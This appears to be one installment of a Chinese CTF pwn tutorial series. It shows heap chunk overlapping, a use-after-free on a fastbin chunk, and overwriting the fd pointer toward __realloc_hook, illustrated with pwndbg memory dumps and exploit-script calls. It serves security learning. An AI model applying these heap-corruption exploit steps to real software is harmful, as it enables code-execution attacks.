# 关键句（文章提要）
<font style="color:#F5222D;">利用chunk Extend/Overlapping修改size将chunk加入unsortedbin，malloc造成unsortedbin切割，再次malloc即可导致两个指针指向同一片区域，从而使得释放任意一个之后内存区域仍然可读写。</font>

# 对上一小节进行补充
从上一小节我们知道，index2的内存实际上是没有被释放的，因此可读写；程序读写规则如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610885830509-40e2f4da-608a-4efa-8fce-fc7ad987cb7a.png)

我们将程序断在上一篇文章的末尾处，开始gdb调试：

```python
pwndbg> x/30gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000555555756008
0x555555756010:	0x0000000000000000	0x0000000000000000
0x555555756020 <stdout>:	0x00007ffff7dd2620	0x0000000000000000
0x555555756030 <stdin>:	0x00007ffff7dd18e0	0x0000000000000000
0x555555756040:	0x0000001800000001	0x0000555555757010 #chunk的标志位
0x555555756050:	0x0000006800000001	0x0000555555757030 
0x555555756060:	0x0000006800000001	0x00005555557570a0 #index2处于可写状态
0x555555756070:	0x0000006800000001	0x0000555555757110
0x555555756080:	0x0000006800000001	0x0000555555757180
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

此时的内存：

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x00000000000000e1 #index1 
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090: 0x0000000000000000  0x0000000000000071 #index2（malloc）
0x5555557570a0: 0x00007ffff7dd1b78  0x00007ffff7dd1b78 #unsortedbin指针
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x00000000000000e0  0x0000000000000070 #index3
                #index1+index2_size #index3_size
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x555555757090 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757090
BK: 0x555555757090 ◂— 0x71 /* 'q' */
smallbins
empty
largebins
empty
pwndbg> 
```

继续根据exp调试，再次创建一个堆块，将unsortedbin中的chunk申请回来：

```python
create(0x60) #5
```

现在申请回来的chunk可以命名为index5

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x0000000000000071 #index1 （chunk_size_changed）
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090: 0x0000000000000000  0x0000000000000071 #index2（index5）
0x5555557570a0: 0x0000000000000000  0x0000000000000000 <-chunk_changed
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x0000000000000000  0x0000000000000071 #index3(chunk_changed)
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

看一下堆块状况：

```python
pwndbg> x/30gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000555555756008
0x555555756010:	0x0000000000000000	0x0000000000000000
0x555555756020 <stdout>:	0x00007ffff7dd2620	0x0000000000000000
0x555555756030 <stdin>:	0x00007ffff7dd18e0	0x0000000000000000
0x555555756040:	0x0000001800000001	0x0000555555757010
0x555555756050:	0x0000006800000001	0x0000555555757030
0x555555756060:	0x0000006800000001	0x00005555557570a0 #index2
0x555555756070:	0x0000006800000001	0x0000555555757110
0x555555756080:	0x0000006800000001	0x0000555555757180
0x555555756090:	0x0000006000000001	0x00005555557570a0 #index5
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面内存中可以看到index2和index5的内存区域发生了“重叠”，并且都处于malloc状态，**<font style="color:#F5222D;">这很重要</font>**：

+ index2：malloc
+ index5：malloc

接下来我们删除第二个chunk：

```python
drop(2)
```

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x0000000000000071 #index1
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090: 0x0000000000000000  0x0000000000000071 #index2:free（index5：malloc)
0x5555557570a0: 0x0000000000000000  0x0000000000000000 
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x0000000000000000  0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757090 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

现在index2已经加入到了fastbin中，但是由于堆块发生了重叠，index2指向的内存区域仍然是可读写的。

+ index2：free
+ index5：malloc

```python
pwndbg> x/30gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000555555756008
0x555555756010:	0x0000000000000000	0x0000000000000000
0x555555756020 <stdout>:	0x00007ffff7dd2620	0x0000000000000000
0x555555756030 <stdin>:	0x00007ffff7dd18e0	0x0000000000000000
0x555555756040:	0x0000001800000001	0x0000555555757010 
0x555555756050:	0x0000006800000001	0x0000555555757030
0x555555756060:	0x0000000000000000	0x0000000000000000 #index2（free）
0x555555756070:	0x0000006800000001	0x0000555555757110
0x555555756080:	0x0000006800000001	0x0000555555757180
0x555555756090:	0x0000006000000001	0x00005555557570a0 #index5（malloc）
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

> 来理清一下思路：
>
> 我们将处于unsortedbin中的index2申请了回来（表面上是处于bin中，但实际上是处于malloc状态），现在申请那片内存区域命名为index5，换句话来说现在那片内存区域有两个名字：“index2”和“index5”，正是由于之前使用chunk chunk Extend/Overlapping导致了这种情况（堆块重叠）的发生；当我们将index2 free掉时，但是index为5的chunk并没有free，并且index2和index5指向同一片内存区域，**<font style="color:#F5222D;">所以free掉之后的那片内存区域仍然可写。</font>****<font style="color:#F5222D;">（仔细理解一下，可能有点绕）</font>**
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610885482101-7519aa40-1660-4464-9d43-8f41c51c4367.png)

> **<font style="color:#F5222D;">释放时chunk标志位置0</font>**
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610885353432-a4523306-aaf0-4d96-ab3e-dafecae20fe8.png)

> **<font style="color:#F5222D;">写入堆内存时判断标志位是否为1</font>**
>

**<font style="color:#F5222D;">好了，现在我们知道那片内存可写，并且处于fastbin中，现在可以修改fd指针了。</font>**

```python
write(5, 0x60, p64(realloc_hook_addr-0x1b)+'b'*0x58)
```

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x0000000000000071 #index1
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2:free（index5：malloc)
0x5555557570a0:	0x00007ffff7dd1aed	0x6262626262626262
0x5555557570b0:	0x6262626262626262	0x6262626262626262
0x5555557570c0:	0x6262626262626262	0x6262626262626262
0x5555557570d0:	0x6262626262626262	0x6262626262626262
0x5555557570e0:	0x6262626262626262	0x6262626262626262
0x5555557570f0:	0x6262626262626262	0x6262626262626262
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x0000000000000000  0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757090 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

修改fd指针之后就可以利用fastbin进行**Arbitrary Alloc了，但是还有困难等着我们，下一小节再说。**

> **<font style="color:#F5222D;">做pwn一定要注重细节，不能放过每一行C语言代码，否则会被坑的很惨。</font>**
>

